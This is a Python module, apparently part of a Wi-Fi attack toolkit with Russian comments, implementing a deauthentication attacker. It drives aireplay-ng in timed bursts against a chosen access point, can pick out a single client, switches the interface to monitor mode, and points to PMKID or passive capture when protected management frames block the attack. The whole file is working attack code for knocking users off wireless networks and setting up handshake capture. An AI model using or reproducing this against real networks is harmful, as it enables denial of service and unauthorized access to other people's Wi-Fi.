"""Деаутентификация: пачками, с паузами, выборочно по клиенту.

`aireplay-ng --deauth 0` висит бесконечно и не даёт управлять ритмом, поэтому
пачки отправляются циклом: серия — пауза — серия, до команды стоп.
"""

from __future__ import annotations

import threading
import time

from . import link
from .base import ResourceSet, WilfiError, require, run
from .scan import Ap


class Deauther:
    def __init__(self, iface: str):
        self.iface = iface
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None
        self.sent_bursts = 0
        self.client: str | None = None
        self.bssid = ""
        self.resources = ResourceSet("deauth")
        self.last_error = ""

    @property
    def running(self) -> bool:
        return bool(self._thread and self._thread.is_alive())

    def start(self, ap: Ap, client: str | None = None, burst: int = 8, interval: float = 2.5,
              monitor_ready: bool = False) -> dict:
        if self.running:
            raise WilfiError("деаут уже идёт", code="busy")
        if not ap.deauth_ok:
            raise WilfiError(
                "у точки обязательный PMF — деаут будет игнорироваться",
                code="pmf_required",
                detail="используйте PMKID или пассивный захват",
            )
        if not monitor_ready:
            link.to_monitor(self.iface, self.resources)
        link.set_channel(self.iface, ap.channel, ap.band)
        require("aireplay-ng")
        self.bssid = ap.bssid
        self.client = client
        self._stop.clear()
        self.sent_bursts = 0
        self.last_error = ""
        self._thread = threading.Thread(target=self._loop, args=(burst, interval), daemon=True)
        self._thread.start()
        return self.status()

    def _loop(self, burst: int, interval: float) -> None:
        apreq = require("aireplay-ng")
        while not self._stop.is_set():
            argv = [apreq, "--deauth", str(burst), "-a", self.bssid]
            if self.client:
                argv += ["-c", self.client]
            argv.append(self.iface)
            res = run(argv, timeout=max(10.0, burst * 1.5))
            if not res.ok:
                self.last_error = (res.err or res.out).strip()[-400:]
                if "Injection is working" not in res.out:
                    self._stop.wait(1.5)
                    continue
            self.sent_bursts += 1
            self._stop.wait(interval)
        self.resources.rollback()

    def stop(self) -> dict:
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=10)
        self.resources.rollback()
        return self.status()

    def status(self) -> dict:
        return {
            "running": self.running,
            "bssid": self.bssid,
            "client": self.client,
            "bursts": self.sent_bursts,
            "error": self.last_error or None,
        }
